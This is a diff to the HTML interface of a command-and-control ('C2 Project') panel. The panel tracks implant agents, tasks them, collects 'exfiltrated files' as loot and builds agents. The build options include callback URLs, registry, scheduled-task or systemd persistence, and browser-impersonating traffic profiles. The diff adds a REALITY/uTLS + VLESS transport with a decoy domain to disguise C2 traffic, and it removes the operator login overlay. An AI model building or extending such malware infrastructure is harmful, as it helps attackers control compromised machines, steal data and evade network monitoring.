@@ -16,20 +16,7 @@
 
 <body>
 
-    <!-- ══ Auth Overlay ══ -->
-    <div class="auth-overlay" id="auth-overlay">
-        <div class="auth-box">
-            <span class="auth-icon">⬡</span>
-            <h2 class="auth-title">C2 Project</h2>
-            <p class="auth-sub">Enter the operator API key to continue</p>
-            <input type="password" class="auth-input" id="auth-key-input" placeholder="API key" autocomplete="off"
-                onkeydown="if(event.key==='Enter') submitApiKey()">
-            <button class="auth-btn" onclick="submitApiKey()">AUTHENTICATE</button>
-            <p class="auth-error" id="auth-error"></p>
-        </div>
-    </div>
-
-    <!-- ══ Sidebar Navigation ══ -->
+    <!-- Sidebar navigation -->
     <nav class="sidebar" id="sidebar">
         <div class="sidebar-brand">
             <span class="brand-icon">⬡</span>
@@ -62,12 +49,10 @@
         </div>
     </nav>
 
-    <!-- ══ Main Content Area ══ -->
+    <!-- Main content -->
     <main class="main-content">
 
-        <!-- ════════════════════════════════════════ -->
-        <!--  SECTION: Control                       -->
-        <!-- ════════════════════════════════════════ -->
+        <!-- Control -->
         <section class="section active" id="section-control">
 
             <!-- Stat Cards -->
@@ -75,32 +60,34 @@
                 <div class="stat-card">
                     <div class="stat-icon agents-icon">◉</div>
                     <div class="stat-info">
-                        <span class="stat-value" id="stat-agents">0</span>
-                        <span class="stat-label">Active Agents</span>
+                        <span class="stat-value" id="stat-agents">--</span>
+                        <span class="stat-label">Registered Agents</span>
                     </div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-icon pending-icon">◷</div>
                     <div class="stat-info">
-                        <span class="stat-value" id="stat-pending">0</span>
+                        <span class="stat-value" id="stat-pending">--</span>
                         <span class="stat-label">Pending Tasks</span>
                     </div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-icon complete-icon">✓</div>
                     <div class="stat-info">
-                        <span class="stat-value" id="stat-completed">0</span>
+                        <span class="stat-value" id="stat-completed">--</span>
                         <span class="stat-label">Completed</span>
                     </div>
                 </div>
                 <div class="stat-card">
                     <div class="stat-icon builds-icon">⚙</div>
                     <div class="stat-info">
-                        <span class="stat-value" id="stat-builds">0</span>
+                        <span class="stat-value" id="stat-builds">--</span>
                         <span class="stat-label">Builds</span>
                     </div>
                 </div>
             </div>
+
+            <p class="list-error" id="stats-status" role="status" aria-live="polite" aria-atomic="true"></p>
 
             <!-- Two-Column Layout -->
             <div class="control-layout">
@@ -113,11 +100,13 @@
                         </h2>
                         <button class="btn-icon" id="refresh-agents" title="Refresh">⟳</button>
                     </div>
+                    <p class="list-error" id="agents-status" role="status" aria-live="polite" aria-atomic="true"></p>
+                    <p class="download-status" id="agents-action-status" role="status" aria-live="polite" aria-atomic="true"></p>
                     <div class="agent-list" id="agent-list">
                         <div class="empty-state" id="empty-agents">
                             <span class="empty-icon">📡</span>
-                            <p>No agents connected</p>
-                            <p class="empty-sub">Waiting for check-ins…</p>
+                            <p>Agent list unavailable</p>
+                            <p class="empty-sub">Waiting for a successful refresh…</p>
                         </div>
                     </div>
                 </aside>
@@ -161,6 +150,7 @@
                         </button>
                         <input type="file" id="send-file-input" style="display:none" onchange="sendFileToAgent(this)">
                     </div>
+                    <div id="send-file-status" class="download-status" role="status" aria-live="polite"></div>
 
                     <!-- Command Help -->
                     <div class="command-help" id="command-help">
@@ -180,6 +170,7 @@
                                 <p>No tasks yet</p>
                             </div>
                         </div>
+                        <p class="download-status" id="task-action-status" role="status" aria-live="polite" aria-atomic="true"></p>
                     </div>
 
                     <!-- Loot (Exfiltrated Files) -->
@@ -193,14 +184,14 @@
                                 <p>No files exfiltrated yet</p>
                             </div>
                         </div>
+                        <p class="download-status" id="loot-download-status" role="status" aria-live="polite" aria-atomic="true"></p>
+                        <p class="download-status" id="loot-action-status" role="status" aria-live="polite" aria-atomic="true"></p>
                     </div>
                 </section>
             </div>
         </section>
 
-        <!-- ════════════════════════════════════════ -->
-        <!--  SECTION: Deploy                        -->
-        <!-- ════════════════════════════════════════ -->
+        <!-- Deploy -->
         <section class="section" id="section-deploy">
 
             <div class="deploy-layout">
@@ -228,16 +219,63 @@
                                 <select class="form-select" id="build-arch">
                                     <option value="amd64">x86_64 (amd64)</option>
                                     <option value="arm64">ARM64</option>
-                                    <option value="386">x86 (32-bit)</option>
+                                    <option value="386" id="build-arch-386">x86 (32-bit)</option>
                                 </select>
                             </div>
                         </div>
 
                         <div class="form-group">
+                            <label class="form-label" for="build-transport">Transport Mode</label>
+                            <select class="form-select" id="build-transport" onchange="toggleTransportFields()">
+                                <option value="http">🌐 HTTP (direct)</option>
+                                <option value="https_pinned">🔒 HTTPS + Certificate Pin</option>
+                                <option value="reality">🛡️ REALITY (uTLS + VLESS)</option>
+                            </select>
+                            <span class="form-hint">How the agent reaches the C2 server. REALITY uses a uTLS fingerprint preset and VLESS tunnel; browser equivalence has not been measured.</span>
+                        </div>
+
+                        <div class="form-group" id="server-url-group">
                             <label class="form-label" for="build-url">Server Callback URL</label>
                             <input type="text" class="form-input" id="build-url" placeholder="http://192.168.1.100:5000"
                                 value="http://localhost:5000">
                             <span class="form-hint">The address the agent will phone home to</span>
+                        </div>
+
+                        <!-- REALITY-specific fields (hidden by default) -->
+                        <div id="reality-fields" style="display: none;">
+                            <div class="form-group">
+                                <label class="form-label" for="build-vps-addr">VPS Address</label>
+                                <input type="text" class="form-input" id="build-vps-addr" placeholder="server.example:443">
+                                <span class="form-hint">IP:port of the Xray REALITY server</span>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label" for="build-decoy-domain">Decoy Domain</label>
+                                <div class="domain-check-row">
+                                    <input type="text" class="form-input" id="build-decoy-domain" placeholder="example.com" aria-describedby="decoy-domain-hint">
+                                    <button type="button" class="btn-icon domain-check-button" id="check-domain-btn" onclick="checkDecoyDomain()" title="Check whether the certificate fits REALITY's limit">Measure</button>
+                                </div>
+                                <span class="form-hint" id="decoy-domain-hint" role="status" aria-live="polite" aria-atomic="true">Estimate only: checks the presented certificate chain against REALITY's 8,192-byte limit; confirm with a live REALITY connection.</span>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label" for="build-reality-pubkey">X25519 Public Key</label>
+                                <input type="text" class="form-input" id="build-reality-pubkey" placeholder="Base64url-encoded key from 'xray x25519'">
+                                <span class="form-hint">REALITY server's public key (base64url, 32 bytes decoded)</span>
+                            </div>
+
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label class="form-label" for="build-reality-shortid">Short ID</label>
+                                    <input type="text" class="form-input" id="build-reality-shortid" placeholder="Hexadecimal short ID">
+                                    <span class="form-hint">Hex-encoded, from Xray config</span>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label" for="build-vless-uuid">VLESS UUID</label>
+                                    <input type="text" class="form-input" id="build-vless-uuid" placeholder="Client UUID">
+                                    <span class="form-hint">Client UUID from 'xray uuid'</span>
+                                </div>
+                            </div>
                         </div>
 
                         <div class="form-row">
@@ -265,7 +303,7 @@
                                     <option value="4">🦊 Firefox / Linux</option>
                                     <option value="5">🍎 Safari / macOS</option>
                                 </select>
-                                <span class="form-hint">Browser identity the agent will impersonate on the wire</span>
+                                <span class="form-hint">HTTP header profile and, for REALITY, the corresponding uTLS fingerprint family</span>
                             </div>
                             <div class="form-group">
                                 <label class="form-label" for="build-locale">Locale (Accept-Language)</label>
@@ -277,8 +315,8 @@
 
                         <div class="form-row">
                             <div class="form-group">
-                                <label class="form-label">Persistence</label>
-                                <select id="build-persist-method" class="form-control">
+                                <label class="form-label" for="build-persist-method">Persistence</label>
+                                <select id="build-persist-method" class="form-select">
                                     <option value="none">Disabled</option>
                                     <option value="registry">Registry Run Key / Cron (Legacy)</option>
                                     <option value="scheduled_task">Scheduled Task / Systemd (Recommended)</option>
@@ -291,10 +329,11 @@
                             <span class="btn-build-icon">⚡</span>
                             <span class="btn-build-text">BUILD & DOWNLOAD</span>
                         </button>
+                        <p class="inline-action-error" id="build-validation-status" role="alert"></p>
                     </form>
 
                     <!-- Build Progress -->
-                    <div class="build-progress hidden" id="build-progress">
+                    <div class="build-progress hidden" id="build-progress" role="status" aria-live="polite" aria-atomic="true">
                         <div class="progress-bar">
                             <div class="progress-fill" id="progress-fill"></div>
                         </div>
@@ -317,6 +356,8 @@
                             <p class="empty-sub">Build your first agent above</p>
                         </div>
                     </div>
+                    <p class="download-status" id="download-status" role="status" aria-live="polite" aria-atomic="true"></p>
+                    <p class="download-status" id="build-action-status" role="status" aria-live="polite" aria-atomic="true"></p>
                 </div>
 
                 <!-- File Staging (push files to agents) -->
@@ -334,6 +375,8 @@
                         <input type="file" id="stage-file-input" class="stage-file-input">
                         <button class="btn-stage" id="stage-btn" onclick="stageFile()">📤 Upload &amp; Stage</button>
                     </div>
+                    <p class="download-status" id="stage-action-status" role="status" aria-live="polite" aria-atomic="true"></p>
+                    <p class="download-status" id="staged-delete-status" role="status" aria-live="polite" aria-atomic="true"></p>
                     <div class="staged-file-list" id="staged-file-list">
                         <div class="empty-state small">
                             <p>No files staged</p>
@@ -343,9 +386,7 @@
             </div>
         </section>
 
-        <!-- ════════════════════════════════════════ -->
-        <!--  SECTION: TLS                           -->
-        <!-- ════════════════════════════════════════ -->
+        <!-- TLS -->
         <section class="section" id="section-tls">
             <div class="tls-layout">
 
@@ -371,6 +412,7 @@
                         <div class="tls-danger-body">
                             <p class="form-hint">Delete the current certificate and key. The server will fall back to HTTP on next restart. All pinned agents will stop connecting.</p>
                             <button class="btn-delete-cert" id="tls-delete-btn" onclick="deleteCert()">DELETE CERTIFICATE</button>
+                            <p class="download-status" id="tls-action-status" role="status" aria-live="polite" aria-atomic="true"></p>
                         </div>
                     </div>
 
